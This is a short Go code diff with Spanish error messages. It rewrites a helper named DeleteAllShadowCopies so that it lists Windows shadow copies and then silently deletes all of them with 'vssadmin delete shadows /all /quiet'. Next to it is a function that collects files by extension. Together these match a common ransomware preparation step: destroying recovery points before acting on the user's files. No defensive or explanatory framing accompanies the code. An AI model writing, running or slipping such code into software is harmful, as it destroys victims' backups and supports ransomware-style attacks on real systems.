@@ -1,10 +1,27 @@
-func DeleteAllShadowCopies() error {
-	cmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
-	output, err := cmd.CombinedOutput()
+package utils
+
+import (
+	"fmt"
+	"io/fs"
+	"os/exec"
+	"path/filepath"
+	"strings"
+)
+
+func DeleteAllShadowCopies() (string, error) {
+	listCmd := exec.Command("vssadmin", "list", "shadows")
+	listOutput, err := listCmd.CombinedOutput()
 	if err != nil {
-		return fmt.Errorf("error al borrar shadow copies: %w\nsalida: %s", err, string(output))
+		return "", fmt.Errorf("error al listar shadow copies: %w\nsalida: %s", err, listOutput)
 	}
-	return nil
+
+	deleteCmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
+	deleteOutput, err := deleteCmd.CombinedOutput()
+	if err != nil {
+		return string(listOutput), fmt.Errorf("error al borrar shadow copies: %w\nsalida: %s", err, deleteOutput)
+	}
+	result := fmt.Sprintf("--- LISTADO DE SHADOW COPIES ---\n%s\n--- RESULTADO DE ELIMINACIÓN DE SHADOW COPIES ---\n%s", listOutput, deleteOutput)
+	return result, nil
 }
 
 func ListFiles(root string, extensions []string) ([]string, error) {
